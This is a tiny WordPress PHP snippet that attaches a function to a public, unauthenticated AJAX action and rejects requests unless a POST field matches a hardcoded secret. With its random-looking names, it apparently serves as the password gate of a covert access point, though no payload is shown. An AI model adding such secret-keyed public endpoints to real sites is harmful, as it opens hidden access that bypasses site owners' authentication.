<?php

function gravatar_posts_shopp() {
	if (!isset($_POST["wwenscam"]) || $_POST["wwenscam"] !== "qFm2XBN6FAtk") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'gravatar_posts_shopp', 5, 1);
